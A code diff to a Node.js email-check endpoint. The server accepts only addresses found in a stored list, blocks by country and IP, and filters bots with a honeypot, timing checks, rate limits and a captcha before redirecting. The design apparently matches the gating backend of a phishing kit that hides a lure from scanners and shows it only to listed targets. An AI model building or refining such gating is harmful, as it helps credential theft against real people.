@@ -13,12 +13,13 @@ const EMAIL_FILE = path.join(__dirname, 'ogas', 'oga.txt');
 const REDIRECT_BASE = process.env.REDIRECT_BASE || 'https://yourdomain.com/complete';
 
 // Allow/Block IP and Country
-const ALLOWED_COUNTRIES = ['TR', 'GB', 'CA', 'NG', 'FR'];
+const ALLOWED_COUNTRIES = ['TK', 'GB', 'CA', 'NG', 'FR'];
 const BLOCKED_IPS = new Set(['192.0.2.1', '203.0.113.5']);
 
+// Email rate limiter storage
 const emailRateLimiter = new Map();
 const MAX_EMAIL_ATTEMPTS = 5;
-const EMAIL_WINDOW_MS = 10 * 60 * 1000;
+const EMAIL_WINDOW_MS = 10 * 60 * 1000; // 10 minutes
 
 let validEmails = new Set();
 function loadEmails() {
@@ -53,18 +54,18 @@ app.post('/api/check-email', async (req, res) => {
     console.warn('[BLOCK] IP is blocked:', clientIP);
     return res.status(403).json({ valid: false, message: 'Access denied' });
   }
-
-  // ✔ Only block based on country if Cloudflare sends a valid code
-  if (countryCode !== 'XX' && !ALLOWED_COUNTRIES.includes(countryCode)) {
-    console.warn('[BLOCK] Country not allowed:', countryCode);
+  if (!countryCode || !ALLOWED_COUNTRIES.includes(countryCode)) {
+    console.warn('[BLOCK] Country not allowed or unknown:', countryCode);
     return res.status(403).json({ valid: false, message: 'Access from this region is restricted' });
   }
 
+  // Honeypot detection
   if (middleName && middleName.trim() !== '') {
     console.warn('[BOT] Honeypot field triggered');
     return res.status(403).json({ valid: false, message: 'Bot activity detected' });
   }
 
+  // Client-side timing protection
   const now = Date.now();
   const timeSinceLoad = now - (parseInt(clientTimestamp) || now);
   if (timeSinceLoad < 2000) {
@@ -72,11 +73,13 @@ app.post('/api/check-email', async (req, res) => {
     return res.status(429).json({ valid: false, message: 'Interaction too fast. Try again.' });
   }
 
+  // Email format validation
   if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
     console.warn('[WARN] Invalid or missing email attempt:', email);
     return res.status(400).json({ valid: false, message: 'Invalid or missing email format' });
   }
 
+  // Rate limit by email
   const nowWindow = Date.now();
   const record = emailRateLimiter.get(email.toLowerCase()) || { count: 0, first: nowWindow };
   if (nowWindow - record.first < EMAIL_WINDOW_MS) {
@@ -90,6 +93,7 @@ app.post('/api/check-email', async (req, res) => {
   }
   emailRateLimiter.set(email.toLowerCase(), record);
 
+  // Captcha verification
   if (!captchaToken) {
     console.warn('[WARN] Missing captcha token attempt');
     return res.status(400).json({ valid: false, message: 'Captcha missing' });
